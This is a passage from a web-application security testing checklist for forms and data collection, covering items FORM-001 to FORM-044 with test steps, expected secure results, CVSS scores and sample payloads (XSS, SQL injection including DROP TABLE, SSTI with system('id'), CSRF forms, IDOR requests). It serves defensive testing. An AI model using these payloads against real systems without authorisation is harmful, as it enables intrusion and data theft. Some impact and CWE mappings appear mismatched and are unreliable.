# 13. Forms & Data Collection — Checklist

Feature-area security **test cases** for “13. Forms & Data Collection”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*238 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## FORM-001 — Step Bypass to Skip Validation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Start multi-page form 2. Intercept request at step 1 3. Modify step parameter to final step 4. Submit bypassing intermediate validation

**Expected Result:** Application should enforce step sequence server-side

**Payload Example:**

```
{"current_step":1} changed to {"current_step":5} or POST /form/submit bypassing steps
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-002 — Step Order Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Complete step 1 2. Intercept step 2 request 3. Modify step order 4. Access steps out of sequence

**Expected Result:** Steps should be processed in order

**Payload Example:**

```
POST /form/step/3 before completing step 2
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-003 — Hidden Field Manipulation Between Steps
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Complete step 1 with price calculation 2. Intercept step 2 request 3. Modify hidden price field 4. Submit with manipulated price

**Expected Result:** Hidden fields should be validated server-side

**Payload Example:**

```
{"product_price":"0.01",quantity:100}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-004 — Session State Tampering
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Start wizard form 2. Capture session state token 3. Modify state data 4. Submit with tampered state

**Expected Result:** Session state should be cryptographically signed

**Payload Example:**

```
Modify base64 encoded state parameter
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## FORM-005 — Concurrent Step Submission Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Submit step 1 2. Simultaneously submit step 1 again 3. Create duplicate entries 4. Bypass unique constraints

**Expected Result:** Step submission should be atomic

**Payload Example:**

```
Parallel POST /form/step/1 requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## FORM-006 — Previous Step Data Modification
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Complete steps 1-3 2. Go back to step 1 3. Modify data 4. Complete without re-validation

**Expected Result:** Previous steps should re-validate on modification

**Payload Example:**

```
Modify validated data after approval step
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## FORM-007 — Step Progress IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. View own form progress 2. Modify form_id parameter 3. View another user's progress 4. Access their data

**Expected Result:** Progress should be user-specific

**Payload Example:**

```
GET /form/progress?form_id=victim_form_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-008 — Wizard Timeout Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Start form with timeout 2. Let timeout expire 3. Submit old session 4. Bypass timeout restriction

**Expected Result:** Expired sessions should be rejected

**Payload Example:**

```
Submit form after session timeout
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-009 — Step Data Injection via Back Button
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Complete step 1 with XSS 2. Go to step 2 3. Use back button 4. XSS displayed on step 1

**Expected Result:** Displayed data should be sanitized

**Payload Example:**

```
<script>alert('XSS')</script> in step 1 field
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-010 — Conditional Step Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Condition requires step 2a 2. Intercept request 3. Skip to step 3 4. Bypass conditional step

**Expected Result:** Conditional logic should be server-enforced

**Payload Example:**

```
Skip required conditional step via direct request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-011 — Form Completion Token Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Complete form and get token 2. Analyze token structure 3. Generate token for incomplete form 4. Claim completion

**Expected Result:** Completion tokens should be unpredictable

**Payload Example:**

```
Forge completion_token without completing steps
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-012 — Step Validation SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Submit step with SQL payload 2. Check for SQL errors 3. Extract database data 4. Manipulate step logic

**Expected Result:** All inputs should be parameterized

**Payload Example:**

```
step_data='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-013 — Parallel Form Submission
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Start same form twice 2. Complete different paths 3. Submit both 4. Create conflicting data

**Expected Result:** Concurrent forms should be handled

**Payload Example:**

```
Two simultaneous form completions
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder / Multiple Sessions

**References:** CWE-840; PortSwigger Business logic

---

## FORM-014 — CSRF on Form Step
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Multi-Page / Wizard Forms

**Test Steps:** 1. Create malicious page 2. Auto-submit form step 3. Victim visits page 4. Step completed without consent

**Expected Result:** Each step should have CSRF protection

**Payload Example:**

```
<form action="/form/step/2" method="POST"><input name="data" value="malicious"></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## FORM-015 — Stored XSS in Form Field Label
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create form with XSS in field label 2. Save form 3. User views form 4. XSS executes

**Expected Result:** Field labels should be sanitized

**Payload Example:**

```
<script>alert(document.cookie)</script> as field label
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-016 — Stored XSS in Form Description
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create form with XSS in description 2. Publish form 3. Visitors view form 4. XSS executes

**Expected Result:** Descriptions should be sanitized

**Payload Example:**

```
<img src=x onerror=alert('XSS')> in form description
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-017 — Server-Side Template Injection in Form
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create form field with SSTI payload 2. Render form 3. Check for code execution 4. Extract data or execute commands

**Expected Result:** Form content should not be templated

**Payload Example:**

```
{{7*7}} or ${7*'7'} or <%= system('id') %> in field
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap / SSTImap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## FORM-018 — Form Builder IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Edit own form 2. Modify form_id parameter 3. Edit another user's form 4. Modify their form fields

**Expected Result:** Form access should verify ownership

**Payload Example:**

```
GET /api/forms/victim_form_id/edit
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-019 — Form Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Delete own form 2. Modify form_id 3. Delete another user's form 4. Destroy their data

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/forms/victim_form_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-020 — Mass Assignment on Form Fields
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create form field 2. Add extra parameters 3. Modify restricted attributes 4. Create privileged field

**Expected Result:** Only allowed attributes should be accepted

**Payload Example:**

```
{"label":"Name",type:"text",is_admin_only:true,required:false}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## FORM-021 — Form Field Type Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create hidden field 2. Intercept request 3. Change field type to visible 4. Bypass intended design

**Expected Result:** Field types should be validated

**Payload Example:**

```
{"type":"hidden"} changed to {"type":"text"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-022 — Form Logic Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create conditional logic 2. Inject malicious logic 3. Execute arbitrary conditions 4. Bypass form flow

**Expected Result:** Logic should be safely parsed

**Payload Example:**

```
{"condition":"1==1; DROP TABLE forms"} or eval injection
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-023 — Form Calculation Exploitation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create calculated field 2. Manipulate formula 3. Generate negative or extreme values 4. Bypass business rules

**Expected Result:** Calculations should be server-validated

**Payload Example:**

```
{"formula":"price * -1"} or {"formula":"9999999999"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-024 — Form Field Limit Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Check field limit per form 2. Exceed limit via API 3. Create form with excessive fields 4. DoS or storage abuse

**Expected Result:** Field limits should be enforced server-side

**Payload Example:**

```
Create form with 10000 fields
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## FORM-025 — Unauthorized Form Publishing
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create draft form 2. Publish without approval 3. Bypass workflow 4. Make unapproved form public

**Expected Result:** Publishing should require approval

**Payload Example:**

```
POST /api/forms/draft_id/publish without approval
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-026 — Form Clone IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Clone own form 2. Modify source form_id 3. Clone another user's form 4. Steal their design

**Expected Result:** Clone should verify source ownership

**Payload Example:**

```
POST /api/forms/victim_form/clone
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-027 — Form Version Manipulation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create form versions 2. Modify version_id 3. Access/restore unauthorized versions 4. Data manipulation

**Expected Result:** Version access should verify ownership

**Payload Example:**

```
GET /api/forms/123/versions/victim_version
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-028 — SQL Injection in Form Query
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Search forms 2. Inject SQL in search parameter 3. Extract database data 4. Access all forms

**Expected Result:** Search should use parameterized queries

**Payload Example:**

```
search='; SELECT * FROM forms--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-029 — Form Embedding XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Dynamic Form Builder

**Test Steps:** 1. Create form with embed option 2. Generate embed code 3. Inject XSS in embed parameters 4. XSS on embedded sites

**Expected Result:** Embed code should be sanitized

**Payload Example:**

```
<iframe src="form.html?title=<script>alert(1)</script>">
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-030 — Client-Side Validation Bypass
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Fill form with invalid data 2. Intercept request 3. Modify to bypass client validation 4. Submit invalid data

**Expected Result:** Server should re-validate all inputs

**Payload Example:**

```
Bypass JavaScript validation via Burp
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-031 — Length Validation Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Field has max length 10 2. Intercept request 3. Submit 10000 characters 4. Test buffer handling

**Expected Result:** Server should enforce length limits

**Payload Example:**

```
field_value=A*10000
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-032 — Type Validation Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Numeric field required 2. Intercept request 3. Submit string value 4. Test type handling

**Expected Result:** Server should validate data types

**Payload Example:**

```
{"age":"not_a_number"} or {"price":"abc"}
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-033 — Required Field Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Required field on form 2. Intercept request 3. Remove required field 4. Submit without required data

**Expected Result:** Server should check required fields

**Payload Example:**

```
Remove required field from POST body
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-034 — Regex Validation Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Field has regex pattern 2. Analyze regex 3. Craft bypass payload 4. Submit invalid format

**Expected Result:** Server should validate against regex

**Payload Example:**

```
Bypass email regex with edge cases
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Regex Testing

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-035 — HTML5 Validation Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Form uses HTML5 validation 2. Disable JavaScript 3. Submit invalid data 4. Bypass client checks

**Expected Result:** Server should not rely on HTML5 validation

**Payload Example:**

```
Submit without HTML5 validation firing
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-036 — Negative Value Injection
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Quantity field expects positive 2. Submit negative value 3. Check for price manipulation 4. Get credit or bypass

**Expected Result:** Negative values should be rejected

**Payload Example:**

```
{"quantity":-10} for price calculation
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-037 — Boundary Value Testing
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Test field boundaries 2. Submit MIN-1 and MAX+1 values 3. Check for integer overflow 4. Exploit boundary errors

**Expected Result:** Boundaries should be handled correctly

**Payload Example:**

```
{"value":2147483648} or {"value":-2147483649}
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-038 — Unicode Normalization Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Field blocks certain input 2. Use Unicode equivalents 3. Bypass validation 4. Submit blocked content

**Expected Result:** Unicode should be normalized before validation

**Payload Example:**

```
＜script＞ (fullwidth) instead of <script>
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-039 — Null Byte Injection
**Test Category:** Input Validation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Submit field with null byte 2. Check for truncation 3. Bypass validation 4. Submit malicious content

**Expected Result:** Null bytes should be rejected

**Payload Example:**

```
field=valid%00<script>alert(1)</script>
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-040 — Double Encoding Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Validation blocks encoded input 2. Double encode payload 3. Bypass first decode 4. Exploit after second decode

**Expected Result:** All encoding should be handled

**Payload Example:**

```
%253Cscript%253E (double URL encoded)
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-041 — Format String Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Submit format string in field 2. Check for information disclosure 3. Extract memory data 4. System compromise

**Expected Result:** Format strings should be sanitized

**Payload Example:**

```
%s%s%s%s%s%s%s%s%s%s%s%s
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-042 — SQL Injection in Validation
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Field validated against database 2. Inject SQL in field 3. Bypass validation 4. Extract data

**Expected Result:** Validation queries should be parameterized

**Payload Example:**

```
username=admin'-- for uniqueness check
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-043 — Whitelist Bypass via Case
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Whitelist allows specific values 2. Submit with different case 3. Bypass whitelist 4. Accept invalid value

**Expected Result:** Whitelists should be case-insensitive

**Payload Example:**

```
ADMIN instead of admin
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-044 — Array Parameter Pollution
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Validation (Client/Server)

**Test Steps:** 1. Single value expected 2. Submit array of values 3. Bypass validation 4. Processing error or bypass

**Expected Result:** Array handling should be defined

**Payload Example:**

```
field[]=value1&field[]=value2
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## FORM-045 — Conditional Logic Bypass
